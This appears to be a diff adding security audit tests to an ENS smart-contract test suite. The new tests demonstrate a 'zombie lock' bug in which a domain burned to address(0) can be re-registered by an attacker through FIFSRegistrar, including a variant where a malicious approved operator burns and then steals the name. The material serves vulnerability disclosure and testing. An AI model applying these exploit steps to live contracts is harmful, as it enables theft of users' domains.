@@ -6,8 +6,9 @@
 const namehash = require('eth-ens-namehash');
 const sha3 = require('web3-utils').sha3;
 
-const ENSWithFallback = artifacts.require('ENSRegistryWithFallback.sol');
-const ENSRegistry     = artifacts.require('ENSRegistry.sol');
+const ENSWithFallback  = artifacts.require('ENSRegistryWithFallback.sol');
+const ENSRegistry      = artifacts.require('ENSRegistry.sol');
+const FIFSRegistrar    = artifacts.require('FIFSRegistrar.sol');
 const ReverseRegistrar = artifacts.require('ReverseRegistrar.sol');
 const DummyResolver    = artifacts.require('DummyResolver.sol');
 
@@ -261,5 +262,98 @@ contract('BUG #2 — ReverseRegistrar setName ownership transfer', function (acc
         assert.equal(nameForAlice, '',
             '[2.3] BUG CONFIRMED: accounts[0]\'s reverse name is NOT updated (\'\'), even though accounts[1] ' +
             'owns the node and called setName. setName always operates on msg.sender\'s OWN reverse node.');
+    });
+});
+
+// ─────────────────────────────────────────────────────────────────
+// BUG #4 — HIGH: Zombie lock enables silent domain theft via FIFSRegistrar
+// After a domain is "burned" (setOwner → address(0)), it enters a zombie state
+// where owner() = address(0) but the node still exists. FIFSRegistrar.only_owner
+// sees address(0) and allows anyone to re-register the supposedly burned name.
+// ─────────────────────────────────────────────────────────────────
+contract('BUG #4 — Domain Theft via Zombie Lock + FIFSRegistrar', function (accounts) {
+    let newRegistry, fifsRegistrar;
+    const ethNode   = namehash.hash('eth');
+    const aliceNode = namehash.hash('alice.eth');
+
+    // accounts[0] = root admin
+    // accounts[1] = Alice (domain owner)
+    // accounts[2] = attacker
+
+    beforeEach(async () => {
+        const oldRegistry = await ENSRegistry.new();
+        newRegistry = await ENSWithFallback.new(oldRegistry.address);
+
+        // Deploy FIFSRegistrar managing 'eth' in NEW registry
+        fifsRegistrar = await FIFSRegistrar.new(newRegistry.address, ethNode);
+
+        // Root admin creates 'eth' TLD and assigns it to FIFSRegistrar
+        await newRegistry.setSubnodeOwner(ZERO_HASH, sha3('eth'), fifsRegistrar.address, { from: accounts[0] });
+    });
+
+    it('[BUG #4.1] Alice registers, burns, and attacker steals via FIFSRegistrar.register()', async () => {
+        // Step 1: Alice registers alice.eth via FIFSRegistrar
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
+        assert.equal(await newRegistry.owner(aliceNode), accounts[1], 'Alice owns alice.eth after registration');
+
+        // Step 2: Alice "burns" her domain by setting owner to address(0)
+        // She expects this to permanently retire the name — but it zombie-locks it instead
+        await newRegistry.setOwner(aliceNode, ZERO_ADDRESS, { from: accounts[1] });
+
+        // Verify zombie state: owner() = address(0), recordExists = true
+        const ownerAfterBurn = await newRegistry.owner(aliceNode);
+        assert.equal(ownerAfterBurn, ZERO_ADDRESS, '[4.1] owner() returns address(0) after burn — appears retired');
+
+        const existsAfterBurn = await newRegistry.recordExists(aliceNode);
+        assert.equal(existsAfterBurn, true,
+            '[4.1] BUG: recordExists = true even though Transfer event said address(0). ' +
+            'Storage holds address(ENSRegistryWithFallback), not address(0).');
+
+        // Step 3: Attacker exploits — FIFSRegistrar.only_owner sees address(0) and allows re-registration
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
+
+        const ownerAfterSteal = await newRegistry.owner(aliceNode);
+        assert.equal(ownerAfterSteal, accounts[2],
+            '[4.1] BUG CONFIRMED: Attacker (accounts[2]) now owns alice.eth. ' +
+            'A domain Alice burned is silently stolen. Alice has no recourse — she already ' +
+            '"transferred" the name out of her control with the burn transaction.');
+    });
+
+    it('[BUG #4.2] Theft also works when burn is triggered via setRecord(node, address(0), ...)', async () => {
+        // Register alice.eth for Alice
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
+
+        // Alice uses setRecord (a more complete "burn" attempt) — same zombie outcome
+        await newRegistry.setRecord(aliceNode, ZERO_ADDRESS, ZERO_ADDRESS, 0, { from: accounts[1] });
+
+        // Confirm zombie state
+        assert.equal(await newRegistry.owner(aliceNode), ZERO_ADDRESS, 'Appears burned');
+        assert.equal(await newRegistry.recordExists(aliceNode), true, 'But still exists');
+
+        // Attacker steals
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
+        assert.equal(await newRegistry.owner(aliceNode), accounts[2],
+            '[4.2] BUG CONFIRMED: Domain stolen after setRecord burn. ' +
+            'Any method that routes through _setOwner with address(0) creates the same theft vector.');
+    });
+
+    it('[BUG #4.3] Malicious operator can trigger zombie + steal without Alice\'s direct action', async () => {
+        // Register alice.eth for Alice
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
+
+        // Alice approves accounts[2] as an operator (e.g., a marketplace contract)
+        await newRegistry.setApprovalForAll(accounts[2], true, { from: accounts[1] });
+
+        // Malicious/compromised operator zombie-locks Alice's domain
+        await newRegistry.setOwner(aliceNode, ZERO_ADDRESS, { from: accounts[2] });
+
+        // Operator immediately re-registers the domain for themselves via FIFSRegistrar
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
+
+        assert.equal(await newRegistry.owner(aliceNode), accounts[2],
+            '[4.3] BUG CONFIRMED: Approved operator stole Alice\'s domain. ' +
+            'Alice gave a marketplace contract operator rights; that contract exploited the ' +
+            'zombie lock to permanently transfer alice.eth to the attacker. ' +
+            'Alice cannot recover — the domain is now owned by accounts[2].');
     });
 });
